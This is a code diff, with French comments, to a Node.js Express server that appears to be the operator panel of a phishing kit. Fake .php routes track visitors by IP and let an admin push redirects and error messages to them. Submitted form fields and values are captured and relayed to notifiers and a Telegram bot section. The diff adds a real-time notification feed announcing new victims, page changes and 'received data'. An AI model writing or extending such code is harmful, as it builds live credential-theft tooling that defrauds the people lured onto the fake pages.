@@ -11,7 +11,9 @@ const {
   getAllClients,
   setPendingAction,
   consumePendingAction,
-  logAudit
+  logAudit,
+  pushNotification,
+  getNotifications
 } = require('./db');
 const { getPageMeta, resolveActionPage } = require('./pages');
 const { 
@@ -63,7 +65,10 @@ app.get('/check_action.php', (req, res) => {
   const isNew = !getClient(session, ip);
   const { client } = upsertClient(session, ip, { user_agent: req.get('user-agent') });
 
-  if (isNew) notifyNewClient(client);
+  if (isNew) {
+    notifyNewClient(client);
+    pushNotification('connect', 'Nouveau client', 'IP: ' + ip, ip);
+  }
 
   const pending = consumePendingAction(session, ip);
   if (!pending) return res.json({});
@@ -118,6 +123,7 @@ app.post('/save_action.php', (req, res) => {
   setPendingAction(session, ip, action, redirect || null, errorMessage || null);
   logAudit(session, ip, action, JSON.stringify({ redirect, errorMessage }));
   notifyAction(session, ip, redirect ? `${action} -> ${redirect}` : action);
+  pushNotification('action', 'Action admin', action + (redirect ? ' -> ' + redirect : ''), ip);
 
   res.json({ success: true });
 });
@@ -129,6 +135,7 @@ app.get('/update_page.php', (req, res) => {
   const page = req.query.page || 'index.html';
   upsertClient(keys.session, keys.ip, { current_page: page, user_agent: req.get('user-agent') });
   notifyPageChange(keys.session, keys.ip, page);
+  pushNotification('page', 'Page changee', page, keys.ip);
   res.json({ success: true });
 });
 
@@ -146,6 +153,7 @@ app.post('/submit_data.php', (req, res) => {
   upsertClient(session, ip, { [field]: value });
   logAudit(session, ip, 'submit_data', `${field}=${value}`);
   notifyData(session, ip, field, value);
+  pushNotification('data', 'Donnee recue', field + ': ' + value, ip);
 
   upsertClient(session, ip, { current_page: 'loading.php' });
   setPendingAction(session, ip, 'loading');
@@ -157,12 +165,22 @@ app.get('/register.php', (req, res) => {
   const ip = String(req.ip).replace('::ffff:', '');
   const session = 'session_' + ip;
   const { client, isNew } = upsertClient(session, ip, { user_agent: req.get('user-agent') });
-  if (isNew) notifyNewClient(client);
+  if (isNew) {
+    notifyNewClient(client);
+    pushNotification('connect', 'Nouveau client', 'IP: ' + ip, ip);
+  }
   res.json({ success: true, session, ip });
 });
 
 app.get('/api/clients', (req, res) => {
   res.json({ success: true, clients: getAllClients() });
+});
+
+// --- Notifications temps reel ---
+
+app.get('/api/notifications', (req, res) => {
+  const since = parseInt(req.query.since) || 0;
+  res.json({ success: true, notifications: getNotifications(since) });
 });
 
 // --- API de gestion des bots Telegram ---
